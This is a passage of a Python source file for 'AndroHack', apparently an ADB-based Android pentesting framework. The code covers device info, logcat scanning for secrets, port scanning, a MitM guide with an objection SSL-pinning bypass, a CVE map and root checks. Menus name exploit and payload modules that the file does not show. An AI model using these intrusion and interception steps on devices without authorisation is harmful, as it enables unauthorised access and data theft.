#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroHack — Advanced Android Pentesting Tool
Author : Mr.X
Website: https://whomrx.pages.dev
Blog   : https://whomrxhackers.blogspot.com
Github : https://github.com/Whomrx666
Bot    : https://whomrx-bot.pages.dev
Market : https://whomrx-market.pages.dev
"""

import argparse
import sys
import os
import time
import json
import random
import shutil
import subprocess
import re
import socket
import concurrent.futures
import base64
import platform
from datetime import datetime

# ==================== DISPLAY IMPORTS ====================
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich import box
    from rich.align import Align
    from rich.columns import Columns
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("[!] 'rich' not installed. Run: pip install rich")
    sys.exit(1)

console = Console()

# ==================== CONFIGURATION ====================
VERSION   = "2.0.0"
AUTHOR    = "Mr.X"
WEBSITE   = "https://whomrx.pages.dev"
BLOG      = "https://whomrxhackers.blogspot.com"
GITHUB    = "https://github.com/Whomrx666"
BOT       = "https://whomrx-bot.pages.dev"
MARKET    = "https://whomrx-market.pages.dev"
TOOL_NAME = "AndroHack"
YEAR      = "2026"

# ==================== AUTHOR DATA ====================
AUTHOR_INFO = [
    ("👤 Author", AUTHOR),
    ("🌐 Website", WEBSITE),
    ("📝 Blog", BLOG),
    ("🐙 Github", GITHUB),
    ("🤖 Bot", BOT),
    ("🛒 Market", MARKET),
]

# ==================== BANNER ====================
BANNER_ART = r"""
 ▗▄▖ ▗▖  ▗▖▗▄▄▄ ▗▄▄▖  ▗▄▖ ▗▖ ▗▖ ▗▄▖  ▗▄▄▖▗▖ ▗▖
▐▌ ▐▌▐▛▚▖▐▌▐▌  █▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘
▐▛▀▜▌▐▌ ▝▜▌▐▌  █▐▛▀▚▖▐▌ ▐▌▐▛▀▜▌▐▛▀▜▌▐▌   ▐▛▚▖ 
▐▌ ▐▌▐▌  ▐▌▐▙▄▄▀▐▌ ▐▌▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌
"""

# ==================== MENU OPTIONS ====================
MENU_OPTIONS = [
    ("1",  "📱", "Device Manager"),
    ("2",  "📦", "APK Analyzer"),
    ("3",  "🌐", "Network Scanner"),
    ("4",  "🚨", "Security Scanner"),
    ("5",  "💥", "Exploit Toolkit"),
    ("6",  "🎯", "Payload Generator"),
    ("7",  "📋", "Report Generator"),
    ("8",  "📡", "ADB over WiFi"),
    ("9",  "⚡", "Auto WiFi ADB"),
    ("10", "📸", "Screen Capture"),
    ("11", "📦", "Package Manager"),
    ("12", "🐛", "Logcat Analyzer"),
    ("13", "🔐", "Security Checks"),
    ("14", "📂", "File Manager"),
    ("15", "💻", "ADB Shell"),
    ("16", "🧰", "Remote Toolkit"),
    ("17", "🔧", "Utilities"),
    ("18", "📖", "About"),
    ("0",  "🚪", "Exit"),
]

# Descriptions for help
MENU_DESCRIPTIONS = {
    "1":  "Manage connected Android devices",
    "2":  "Analyze & reverse Android APK files",
    "3":  "Scan hosts, ports & WiFi networks",
    "4":  "Detect vulnerabilities & security issues",
    "5":  "Deep links, intents & testing modules",
    "6":  "Generate APK payloads & test payloads",
    "7":  "Export HTML, JSON & PDF reports",
    "8":  "Connect Android devices via WiFi",
    "9":  "Automatically switch USB ADB to WiFi",
    "10": "Capture screenshots from device",
    "11": "List, install & uninstall applications",
    "12": "Analyze Logcat output for debugging",
    "13": "SSL pinning & app security inspection",
    "14": "Push & pull files using ADB",
    "15": "Interactive Android shell session",
    "16": "Screen, camera & file management tools",
    "17": "Encoding, hashing & helper utilities",
    "18": "About AndroHack",
    "0":  "Exit AndroHack",
}

REMOTE_CONTROL_OPTIONS = [
    ("1", "🖥️", "Remote Screen"),
    ("2", "📁", "File Explorer"),
    ("3", "📷", "Camera Control"),
    ("4", "📸", "Take Screenshot"),
    ("5", "🎥", "Screen Recorder"),
    ("6", "⌨️", "Keyboard & Mouse"),
    ("0", "↩️", "Back"),
]

# ==================== DISPLAY UTILITIES ====================
def clear_screen():
    """Clear terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_terminal_width():
    """Detect terminal width."""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def get_terminal_info():
    """Detect OS/terminal."""
    system = platform.system()
    if os.environ.get("TERMUX_VERSION"):
        system = "Termux (Android)"
    elif system == "Linux":
        system = "Linux"
    elif system == "Windows":
        system = "Windows"
    elif system == "Darwin":
        system = "macOS"
    else:
        system = system if system else "Unknown"
    return system

def print_separator(char="═", style="cyan"):
    """Print separator line."""
    console.rule(style=style)

def show_banner():
    """Display banner with gradient and minimal spacing."""
    clear_screen()
    lines = BANNER_ART.strip('\n').split('\n')
    banner_text = Text()
    colors = ["bold magenta", "bold bright_magenta", "bold purple", "bold deep_pink3", "bold orchid", "bold violet"]
    for i, line in enumerate(lines):
        if line.strip():
            banner_text.append(line + "\n", style=colors[i % len(colors)])
        else:
            banner_text.append("\n")
    console.print(Align.center(banner_text))

    # Tagline immediately after banner with minimal gap
    tagline = Text("◈  ADVANCED ANDROID PENTESTING FRAMEWORK◈", style="bold italic bright_magenta")
    console.print(Align.center(tagline))
    console.rule(style="magenta")  # separator line under tagline

def show_status():
    """Display status line, terminal info centered on separate line."""
    try:
        devices = list_devices(print_output=False)
        device_count = len(devices)
        status_color = "green" if device_count > 0 else "red"
        device_text = f"[{status_color}]{device_count} Connected[/]"
    except:
        device_text = "[yellow]ADB Not Found[/]"

    now = datetime.now().strftime("%H:%M:%S")
    term_info = get_terminal_info()

    # Status line without terminal info
    status_line = (
        f"[bold white]{now}[/]  |  "
        f"[bold cyan]Devices:[/] {device_text}  |  "
        f"[bold green]v{VERSION}[/]  |  "
        f"[bold magenta]Author: {AUTHOR}[/]"
    )
    console.print(Align.center(status_line))
    # Terminal info on its own centered line
    console.print(Align.center(f"[bold cyan]Terminal: {term_info}[/]"))
    console.print()

def show_author_info():
    """Display author info panel."""
    info_lines = [f"[bold cyan]{label:12}[/] : [yellow]{value}[/]" for label, value in AUTHOR_INFO]
    info_text = "\n".join(info_lines)
    panel = Panel(
        info_text,
        title="[bold magenta]👤 AUTHOR INFO[/]",
        border_style="cyan",
        box=box.DOUBLE_EDGE,
        padding=(1, 2),
        width=min(console.width - 4, 70)
    )
    console.print(Align.center(panel))

def show_legal_disclaimer():
    """Display legal disclaimer panel."""
    disclaimer_text = (
        "[white]AndroHack is designed for authorized security testing ONLY.\n"
        "Use of this tool against systems you do not own or have explicit written\n"
        "permission to test is [bold red]ILLEGAL[/] and may result in criminal prosecution.\n"
        "The author assumes no liability for misuse.[/]"
    )
    panel = Panel(
        disclaimer_text,
        title="[bold red]⚠ LEGAL DISCLAIMER[/]",
        border_style="red",
        box=box.DOUBLE_EDGE,
        padding=(1, 2),
        width=min(console.width - 4, 80)
    )
    console.print(Align.center(panel))

def show_help_menu():
    """Display full help menu."""
    help_lines = []
    for num, icon, name in MENU_OPTIONS:
        desc = MENU_DESCRIPTIONS.get(num, "")
        help_lines.append(f"[bold cyan]{num:>2}.[/] {icon} [bold white]{name:<24}[/] [dim]{desc}[/]")
    help_text = "\n".join(help_lines)
    panel = Panel(
        help_text,
        title="[bold cyan]📖 HELP - MODULE DESCRIPTIONS[/]",
        border_style="yellow",
        box=box.HEAVY,
        padding=(1, 2),
        width=min(console.width - 4, 80)
    )
    console.print(Align.center(panel))

def show_guide():
    """Display complete usage guide from start to finish."""
    guide_text = """
[bold cyan]📘 ANDROHACK - COMPLETE USAGE GUIDE[/]

[bold magenta]STEP 1: PREPARATION[/]
  1. Install required dependencies:
     - Termux: pkg install python adb
     - Linux: sudo apt install python3 adb
  2. Install Python packages:
     pip install rich
  3. Enable Developer Options on your Android device:
     Settings > About Phone > Tap Build Number 7 times
  4. Enable USB Debugging:
     Settings > Developer Options > USB Debugging
  5. Connect your device via USB cable (or use WiFi ADB later)

[bold magenta]STEP 2: STARTING ANDROHACK[/]
   Run the tool:
     python3 androhack.py
   You will see the banner and author info.
   Read and accept the legal disclaimer by typing 'y'.

[bold magenta]STEP 3: USING MAIN MENU[/]
   After accepting, you'll see the main menu with numbered options.
   To see full descriptions, type 'help' and press Enter.
   To see this guide again, type 'guide' and press Enter.
   Select a module by typing its number and pressing Enter.

[bold magenta]STEP 4: MODULE EXAMPLES[/]
  - Device Manager: Check connected devices, view device info.
  - Network Scanner: Scan ports or discover devices on your network.
  - Security Scanner: Run vulnerability checks on device or app.
  - Exploit Toolkit: Launch exported activities, test deep links.
  - Payload Generator: Create test APKs or reverse shell commands.
  - Report Generator: Generate professional reports of findings.

[bold magenta]STEP 5: AFTER TESTING[/]
   - Always disconnect ADB when done: adb disconnect
   - Remove any payloads you pushed to the device.
   - Generate a report for documentation.

[bold magenta]TIPS:[/]
   - Use a terminal width of at least 60 columns.
   - If ADB not found, install it first.
   - For WiFi ADB, use option 8 or 9 after USB connection.
   - Press Ctrl+C anytime to safely interrupt.

[bold red]⚠ REMEMBER:[/] Only use on devices you own or have explicit permission to test.
"""
    panel = Panel(
        guide_text,
        title="[bold green]📘 COMPLETE GUIDE[/]",
        border_style="green",
        box=box.DOUBLE_EDGE,
        padding=(1, 2),
        width=min(console.width - 4, 85)
    )
    console.print(Align.center(panel))

def show_about():
    """Display about panel."""
    about_text = f"""
[bold cyan]{TOOL_NAME} v{VERSION}[/]
Advanced Android Penetration Testing Framework

[white]A comprehensive tool for ethical hackers and security professionals.
Covers static APK analysis, dynamic runtime analysis via ADB,
network scanning, vulnerability mapping, exploit assistance,
payload generation, and professional report generation.[/]

[bold magenta]Author :[/] [white]{AUTHOR}[/]
[bold magenta]Website:[/] [cyan]{WEBSITE}[/]
[bold magenta]Blog   :[/] [cyan]{BLOG}[/]
[bold magenta]Github :[/] [cyan]{GITHUB}[/]
[bold magenta]Bot    :[/] [cyan]{BOT}[/]
[bold magenta]Market :[/] [cyan]{MARKET}[/]

[bold red]⚠  For authorized penetration testing use only.[/]
[dim]Unauthorized use is illegal and unethical.[/]
"""
    panel = Panel(
        about_text,
        title=f"[bold magenta]📖 ABOUT {TOOL_NAME}[/]",
        border_style="cyan",
        box=box.DOUBLE_EDGE,
        padding=(1, 2),
        width=min(console.width - 4, 80)
    )
    console.print(Align.center(panel))

def show_main_menu():
    """Display main menu panel without descriptions."""
    menu_lines = []
    for num, icon, name in MENU_OPTIONS:
        if num == "0":
            menu_lines.append(f"[bold red]{num:>2}. {icon} {name}[/]")
        else:
            menu_lines.append(f"[bold cyan]{num:>2}.[/] {icon} [bold white]{name}[/]")
    menu_text = "\n".join(menu_lines)
    panel = Panel(
        menu_text,
        title="[bold magenta]📋 MAIN MENU[/]",
        border_style="green",
        box=box.HEAVY,
        padding=(1, 2),
        width=min(console.width - 4, 60)
    )
    console.print(Align.center(panel))
    # Separator line and centered hint text below the menu
    console.rule(style="dim")
    console.print(Align.center("[dim]Type 'help' for module descriptions, 'guide' for complete guide.[/dim]"))

def show_remote_control_menu():
    """Display remote control menu panel."""
    menu_lines = []
    for num, icon, name in REMOTE_CONTROL_OPTIONS:
        if num == "0":
            menu_lines.append(f"[bold red]{num:>2}. {icon} {name}[/]")
        else:
            menu_lines.append(f"[bold cyan]{num:>2}.[/] {icon} [bold white]{name}[/]")
    menu_text = "\n".join(menu_lines)
    panel = Panel(
        menu_text,
        title="[bold magenta]🎛️ REMOTE CONTROL[/]",
        border_style="green",
        box=box.HEAVY,
        padding=(1, 2),
        width=min(console.width - 4, 60)
    )
    console.print(Align.center(panel))

def show_intro_loading():
    """Cyberpunk loading animation."""
    clear_screen()
    console.print(Align.center(f"[bold magenta]⚡ Initializing {TOOL_NAME}...[/]\n"))
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=40),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("[cyan]🔧 Loading modules...", total=100)
        while not progress.finished:
            progress.update(task, advance=1)
            time.sleep(0.02)

# ==================== ADB FUNCTIONS ====================
def run_adb(args: list, device_id: str = None, capture: bool = True):
    """Run an adb command and return stdout, returncode."""
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += args
    try:
        result = subprocess.run(cmd, capture_output=capture, text=True, timeout=30)
        return result.stdout.strip(), result.returncode
    except FileNotFoundError:
        return None, -1
    except subprocess.TimeoutExpired:
        return "TIMEOUT", -2

def run_adb_global(args: list, capture: bool = True):
    """Run a global adb command without selecting a device."""
    try:
        result = subprocess.run(["adb"] + args, capture_output=capture, text=True, timeout=30)
        output = "\n".join(part for part in [result.stdout.strip(), result.stderr.strip()] if part)
        return output, result.returncode
    except FileNotFoundError:
        return None, -1
    except subprocess.TimeoutExpired:
        return "TIMEOUT", -2

def check_adb():
    """Check if adb is installed."""
    out, rc = run_adb(["version"])
    if rc == -1:
        console.print("[bold red]✗ ADB not found![/] Install Android Debug Bridge first.", style="red")
        return False
    console.print(f"[green]✓ ADB found:[/] {out.splitlines()[0]}")
    return True

def list_devices(print_output=True):
    """List all connected Android devices."""
    out, rc = run_adb(["devices", "-l"])
    if out is None:
        if print_output:
            console.print("[red]ADB not available.[/]")
        return []

    lines = out.strip().splitlines()
    devices = []
    if print_output:
        console.rule("[bold magenta]📱 Connected Devices[/]")
    for line in lines[1:]:
        if not line.strip():
            continue
        parts = line.split()
        if len(parts) < 2:
            continue
        serial = parts[0]
        state = parts[1]
        model = next((p.split(":")[1] for p in parts if p.startswith("model:")), "Unknown")
        transport = next((p.split(":")[1] for p in parts if p.startswith("transport_id:")), "N/A")
        devices.append({"serial": serial, "state": state, "model": model})
        if print_output:
            console.print(f"[cyan]{serial:<20}[/] [green]{state:<10}[/] [yellow]{model:<15}[/] [white]{transport}[/]")

    if not devices and print_output:
        console.print("[yellow]⚠  No devices connected. Connect a device and enable USB Debugging.[/]")
    return devices

def device_info(device_id: str):
    """Gather comprehensive device info."""
    props = {
        "Brand": "ro.product.brand",
        "Model": "ro.product.model",
        "Android Version": "ro.build.version.release",
        "SDK Level": "ro.build.version.sdk",
        "Build ID": "ro.build.id",
        "Security Patch": "ro.build.version.security_patch",
        "Fingerprint": "ro.build.fingerprint",
        "CPU ABI": "ro.product.cpu.abi",
        "IMEI (if rooted)": "ril.serialnumber",
        "Serial": "ro.serialno",
    }

    console.rule(f"[bold magenta]🔎 Device Info [{device_id}][/]")
    for label, prop in props.items():
        val, _ = run_adb(["shell", f"getprop {prop}"], device_id)
        console.print(f"[cyan]{label:<20}[/] [white]{val or 'N/A'}[/]")

def list_packages(device_id: str, pkg_filter: str = "all"):
    """List installed packages."""
    flags = {
        "all": [],
        "system": ["-s"],
        "third_party": ["-3"],
        "disabled": ["-d"],
    }
    flag = flags.get(pkg_filter, [])
    out, _ = run_adb(["shell", "pm", "list", "packages"] + flag, device_id)
    if not out:
        console.print("[red]Could not fetch packages.[/]")
        return []

    packages = [line.replace("package:", "").strip() for line in out.splitlines() if line.startswith("package:")]

    console.rule(f"[bold magenta]📦 Packages ({pkg_filter}) — {len(packages)} found[/]")
    for i, pkg in enumerate(packages, 1):
        console.print(f"[dim]{i:>4}.[/] [white]{pkg}[/]")
    return packages

def dumpsys(device_id: str, service: str = "package"):
    """Run dumpsys for a given service."""
    console.print(f"[cyan]Running dumpsys {service}...[/]")
    out, _ = run_adb(["shell", "dumpsys", service], device_id)
    if out:
        console.rule(f"[bold]dumpsys {service}[/]")
        console.print(out[:3000] + ("..." if len(out) > 3000 else ""))
    return out

def capture_logcat(device_id: str, lines: int = 200):
    """Capture last N lines of logcat."""
    console.print(f"[cyan]Capturing last {lines} lines of logcat...[/]")
    out, _ = run_adb(["shell", f"logcat -d -t {lines}"], device_id)
    filename = f"androhack_logcat_{int(time.time())}.txt"
    if out:
        with open(filename, "w") as f:
            f.write(out)
        console.print(f"[green]✓ Logcat saved to:[/] {filename}")

    patterns = ["password", "token", "secret", "api_key", "auth", "credential", "private"]
    hits = []
    for line in out.splitlines():
        low = line.lower()
        for p in patterns:
            if p in low:
                hits.append(line)
                break

    if hits:
        console.rule("[bold red]⚠ Sensitive Patterns in Logcat[/]")
        for h in hits[:20]:
            console.print(f"  [red]▸[/] {h}")
    return out

def pull_file(device_id: str, remote_path: str, local_path: str = "."):
    """Pull a file from device."""
    out, rc = run_adb(["pull", remote_path, local_path], device_id)
    if rc == 0:
        console.print(f"[green]✓ Pulled:[/] {remote_path} → {local_path}")
    else:
        console.print(f"[red]✗ Failed to pull {remote_path}[/]")

def push_file(device_id: str, local_path: str, remote_path: str):
    """Push a file to device."""
    out, rc = run_adb(["push", local_path, remote_path], device_id)
    if rc == 0:
        console.print(f"[green]✓ Pushed:[/] {local_path} → {remote_path}")
    else:
        console.print(f"[red]✗ Failed to push {local_path}[/]")

def take_screenshot(device_id: str):
    """Take a screenshot and pull it."""
    remote = "/sdcard/androhack_screen.png"
    local = "androhack_screen.png"
    run_adb(["shell", "screencap", "-p", remote], device_id)
    pull_file(device_id, remote, local)
    run_adb(["shell", "rm", remote], device_id)
    return local

def enable_adb_wifi(device_id: str, port: int = 5555):
    """Enable ADB over WiFi."""
    console.print(f"[cyan]Enabling ADB over WiFi on port {port}...[/]")
    run_adb(["shell", f"setprop service.adb.tcp.port {port}"], device_id)
    run_adb(["shell", "stop adbd && start adbd"], device_id)
    ip_out, _ = run_adb(["shell", "ip addr show wlan0"], device_id)
    ip_match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", ip_out or "")
    if ip_match:
        ip = ip_match.group(1)
        console.print(f"[green]✓ ADB WiFi enabled![/] Connect with: [bold yellow]adb connect {ip}:{port}[/]")
        return ip, port
    else:
        console.print("[yellow]⚠  Could not determine device IP. Connect manually.[/]")
        return None, port

def _extract_device_ip(text: str) -> str:
    match = re.search(r"\binet\s+(\d+\.\d+\.\d+\.\d+)", text or "")
    if match:
        return match.group(1)
    match = re.search(r"\bsrc\s+(\d+\.\d+\.\d+\.\d+)", text or "")
    if match:
        return match.group(1)
    return None

def _get_wifi_ip(device_id: str) -> str:
    wlan_out, _ = run_adb(["shell", "ip addr show wlan0"], device_id)
    ip = _extract_device_ip(wlan_out or "")
    if ip:
        return ip
    route_out, _ = run_adb(["shell", "ip route"], device_id)
    return _extract_device_ip(route_out or "")

def auto_adb_wifi_connect(device_id: str, port: int = 5555):
    """Automatically switch USB ADB to WiFi mode and connect."""
    if not device_id:
        console.rule("[bold red]Auto ADB WiFi Connect[/]")
        console.print("[red]No device selected.[/] Connect a device with USB Debugging enabled and try again.")
        return False

    ip = _get_wifi_ip(device_id)
    if not ip:
        console.rule("[bold red]Auto ADB WiFi Connect[/]")
        console.print("[red]Could not determine device WiFi IP.[/] Make sure WiFi is enabled and same network.")
        return False

    console.print(f"[cyan]Switching ADB to TCP mode on port {port}...[/]")
    tcpip_out, tcpip_rc = run_adb(["tcpip", str(port)], device_id)
    if tcpip_rc != 0:
        console.rule("[bold red]Auto ADB WiFi Connect[/]")
        console.print(f"[red]Failed to enable ADB TCP mode.[/]\n{tcpip_out or '(no output)'}")
        return False

    time.sleep(2)
    target = f"{ip}:{port}"
    console.print(f"[cyan]Connecting to {target}...[/]")
    connect_out, connect_rc = run_adb_global(["connect", target])
    connected = connect_out and ("connected to" in connect_out.lower() or "already connected" in connect_out.lower())
    if connect_rc != 0 or not connected:
        console.rule("[bold red]Auto ADB WiFi Connect[/]")
        console.print(f"[red]Failed to connect over ADB WiFi.[/]\n{connect_out or '(no output)'}")
        return False

    console.rule("[bold green]Auto ADB WiFi Connect[/]")
    console.print(f"[green]ADB WiFi connection ready.[/]\nConnected to: [cyan]{target}[/]\nYou can now unplug the USB cable.\n{connect_out}")
    return True

def shell_cmd(device_id: str, cmd: str):
    """Execute a raw shell command."""
    out, rc = run_adb(["shell", cmd], device_id)
    console.rule(f"[dim]$ {cmd}[/]")
    console.print(out or "(no output)")
    return out

def interactive_shell(device_id: str):
    """Drop into an interactive ADB shell."""
    console.print("[bold yellow]Dropping into ADB shell. Type 'exit' to return.[/]")
    cmd = ["adb"]
    if device_id:
        cmd += ["-s", device_id]
    cmd += ["shell"]
    subprocess.call(cmd)

# ==================== NETWORK SCANNER FUNCTIONS ====================
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5555: "ADB",
    5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    8888: "HTTP-Alt2", 27017: "MongoDB", 9200: "Elasticsearch",
    4444: "Metasploit", 1099: "RMI", 8161: "ActiveMQ",
}

def get_device_ip(device_id: str) -> str:
    """Get device IP via ADB."""
    out, _ = run_adb(["shell", "ip addr show wlan0"], device_id)
    match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/", out or "")
    if match:
        return match.group(1)
    out2, _ = run_adb(["shell", "netcfg"], device_id)
    match2 = re.search(r"wlan0\s+UP\s+(\d+\.\d+\.\d+\.\d+)", out2 or "")
    return match2.group(1) if match2 else None

def get_wifi_info(device_id: str) -> dict:
    """Retrieve WiFi connection details."""
    info = {}
    wpa, _ = run_adb(["shell", "wpa_cli status"], device_id)
    dumpsys, _ = run_adb(["shell", "dumpsys wifi | grep -E 'SSID|BSSID|freq|rssi|ip_address'"], device_id)

    for line in (wpa + "\n" + dumpsys).splitlines():
        kv = line.strip().split("=", 1)
        if len(kv) == 2:
            k, v = kv[0].strip().lower(), kv[1].strip()
            if "ssid" in k and "bssid" not in k:
                info["SSID"] = v.strip('"')
            elif "bssid" in k:
                info["BSSID"] = v
            elif "freq" in k:
                info["Frequency"] = v + " MHz"
            elif "rssi" in k or "signal" in k:
                info["Signal"] = v + " dBm"
            elif "ip_address" in k or (k == "ip_address"):
                info["IP"] = v
            elif "security" in k or "key_mgmt" in k:
                info["Security"] = v

    console.rule("[bold magenta]📶 WiFi Info[/]")
    for k, v in info.items():
        console.print(f"[cyan]{k:<12}[/] [white]{v}[/]")
    return info

def _scan_port(host: str, port: int, timeout: float = 0.8) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def port_scan(target: str, ports: list = None, timeout: float = 0.8, max_workers: int = 100):
    """Fast multithreaded port scanner."""
    if ports is None:
        ports = list(COMMON_PORTS.keys())

    console.rule(f"[bold cyan]Port Scanning: {target}[/]")
    open_ports = []

    with console.status(f"[cyan]Scanning {len(ports)} ports on {target}...[/]"):
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(_scan_port, target, p, timeout): p for p in ports}
            for fut in concurrent.futures.as_completed(futures):
                port = futures[fut]
                if fut.result():
                    open_ports.append(port)

    open_ports.sort()
    console.rule("[bold green]Open Ports[/]")
    risky = {21, 23, 3389, 5900, 4444, 1099, 5555}
    for p in open_ports:
        svc = COMMON_PORTS.get(p, "Unknown")
        risk = "[bold red]HIGH[/]" if p in risky else ("[yellow]MEDIUM[/]" if p in {80, 8080, 27017, 6379} else "[green]LOW[/]")
        console.print(f"[cyan]{p:<6}[/] [white]{svc:<16}[/] {risk}")

    if not open_ports:
        console.print("[yellow]No open ports found in the scanned range.[/]")

    if 5555 in open_ports:
        console.rule("[bold red]⚠ ADB Port Open[/]")
        console.print(f"[bold red]ADB port 5555 is OPEN![/] Exploitable via: [bold yellow]adb connect {target}:5555[/]")

    return open_ports

def discover_devices(subnet: str) -> list:
    """Discover live hosts on a subnet."""
    console.print(f"[cyan]Discovering hosts on {subnet}...[/]")
    try:
        base = ".".join(subnet.split(".")[:3])
        hosts = []
        for i in range(1, 255):
            host = f"{base}.{i}"
            r = subprocess.run(["ping", "-c", "1", "-W", "1", host],
                               capture_output=True, text=True)
            if r.returncode == 0:
                hosts.append(host)
                console.print(f"  [green]✓ Live:[/] {host}")
        return hosts
    except Exception as e:
        console.print(f"[red]Error in discovery: {e}[/]")
        return []

def check_ssl_pinning(device_id: str, package: str) -> dict:
    """Check for SSL pinning indicators."""
    console.print(f"[cyan]Checking SSL pinning for {package}...[/]")
    out, _ = run_adb(["shell", f"logcat -d | grep -i '{package}' | grep -iE 'ssl|tls|pin|certificate'"], device_id)
    indicators = []
    if out:
        if "CertificatePinning" in out or "TrustKit" in out or "OkHttp" in out:
            indicators.append("OkHttp / TrustKit pinning detected")
        if "public key" in out.lower() or "pin" in out.lower():
            indicators.append("Public key pinning suspected")
        if "SSLError" in out:
            indicators.append("SSL errors in logcat (possible MitM attempt detected by app)")

    result = {"pinning_detected": len(indicators) > 0, "indicators": indicators}
    if result["pinning_detected"]:
        console.rule("[bold yellow]SSL Pinning Indicators[/]")
        for ind in indicators:
            console.print(f"  [yellow]▸[/] {ind}")
    else:
        console.print("[green]No obvious SSL pinning indicators in logcat.[/]")
    return result

def mitm_setup_guide():
    """Print a guide for setting up MitM with mitmproxy."""
    console.rule("[bold cyan]MitM Proxy Setup Guide[/]")
    guide = """
1. Install mitmproxy:
   pip install mitmproxy

2. Start transparent proxy:
   mitmproxy --mode transparent --showhost

3. On device (ADB shell, requires root or WiFi proxy):
   adb shell settings put global http_proxy <your-ip>:8080

4. Install mitmproxy CA cert on device:
   Browse to http://mitm.it from the device

5. For SSL Pinning bypass, use Frida + objection:
   objection -g <package_name> explore
   android sslpinning disable

6. Capture traffic:
   mitmweb --mode transparent
    """
    console.print(guide)

# ==================== VULNERABILITY SCANNER FUNCTIONS ====================
SDK_CVE_MAP = {
    "19": [("CVE-2014-7911", "CRITICAL", "Privilege escalation via serialization"),
           ("CVE-2014-3153", "CRITICAL", "futex kernel root exploit (Towelroot)")],
    "21": [("CVE-2015-3636", "HIGH", "Ping socket bug — local privilege escalation"),
           ("CVE-2015-1474", "CRITICAL", "Stagefright integer overflow — RCE via MMS")],
    "22": [("CVE-2015-1474", "CRITICAL", "Stagefright RCE via MMS"),
           ("CVE-2015-6602", "HIGH", "libutils heap overflow")],
    "23": [("CVE-2016-2060", "HIGH", "Qualcomm netd privilege escalation"),
           ("CVE-2016-3861", "HIGH", "LibUtils RCE")],
    "24": [("CVE-2017-0478", "HIGH", "Framesequence library heap overflow")],
    "25": [("CVE-2017-0781", "CRITICAL", "BlueBorne Bluetooth RCE"),
           ("CVE-2017-13156", "HIGH", "Janus APK signature bypass")],
    "26": [("CVE-2018-9341", "HIGH", "libskia heap overflow"),
           ("CVE-2018-9488", "MEDIUM", "Permission bypass in ActivityManager")],
    "27": [("CVE-2019-2001", "MEDIUM", "Information disclosure in ActivityManager")],
    "28": [("CVE-2019-2234", "HIGH", "Camera access from background — privacy bypass")],
    "29": [("CVE-2020-0022", "CRITICAL", "BlueFrag Bluetooth RCE (no user interaction)"),
           ("CVE-2020-0096", "HIGH", "StrandHogg 2.0 — task hijacking w/o root")],
    "30": [("CVE-2021-0395", "HIGH", "System server memory corruption")],
    "31": [("CVE-2022-20007", "HIGH", "ActivityManager task affinity hijacking")],
    "32": [("CVE-2022-20452", "HIGH", "Context isolation bypass")],
    "33": [("CVE-2023-21282", "HIGH", "Media framework RCE"),
           ("CVE-2023-21275", "MEDIUM", "Intent redirection in Settings")],
}

def check_android_version_cves(device_id: str) -> list:
    """Map device Android SDK to known CVEs."""
    sdk, _ = run_adb(["shell", "getprop ro.build.version.sdk"], device_id)
    version, _ = run_adb(["shell", "getprop ro.build.version.release"], device_id)
    patch, _ = run_adb(["shell", "getprop ro.build.version.security_patch"], device_id)

    console.rule("[bold]Android Version Info[/]")
    console.print(f"Android [bold cyan]{version}[/]  SDK [bold yellow]{sdk}[/]  Patch: [dim]{patch}[/]")

    findings = []
    for sdk_key, cves in SDK_CVE_MAP.items():
        if int(sdk or 0) <= int(sdk_key):
            for cve, sev, desc in cves:
                findings.append({"cve": cve, "severity": sev, "detail": desc, "sdk": sdk_key})

    SEV_COLOR = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "cyan"}
    if findings:
        console.rule(f"[bold red]🚨 CVEs for SDK ≤ {sdk}[/]")
        for f in findings:
            sev = f["severity"]
            console.print(f"[cyan]{f['cve']:<16}[/] [{SEV_COLOR.get(sev,'white')}]{sev:<10}[/] [white]{f['detail']}[/]")
    else:
        console.print("[green]✓ No mapped CVEs for this SDK level.[/]")
    return findings

def check_root_status(device_id: str) -> dict:
    """Check if device is rooted."""
    result = {"rooted": False, "methods": []}

    checks = [
        ("which su", "su binary present"),
        ("ls /system/xbin/su", "su in /system/xbin"),
        ("ls /system/bin/su", "su in /system/bin"),
        ("ls /sbin/su", "su in /sbin"),
        ("getprop ro.debuggable", "debuggable build"),
        ("ls /data/local/tmp", "data/local/tmp accessible"),
    ]

    for cmd, label in checks:
        out, _ = run_adb(["shell", cmd], device_id)
        if out and "not found" not in out.lower() and "no such" not in out.lower() and out.strip():
            if cmd == "getprop ro.debuggable" and out.strip() == "0":
                continue
            result["rooted"] = True
            result["methods"].append(label)

    magisk, _ = run_adb(["shell", "pm list packages | grep magisk"], device_id)
    if magisk:
        result["rooted"] = True
        result["methods"].append("Magisk detected")

    supersu, _ = run_adb(["shell", "pm list packages | grep supersu"], device_id)
    if supersu:
        result["rooted"] = True
        result["methods"].append("SuperSU detected")

    if result["rooted"]:
        console.rule("[bold red]🔓 Root Status[/]")
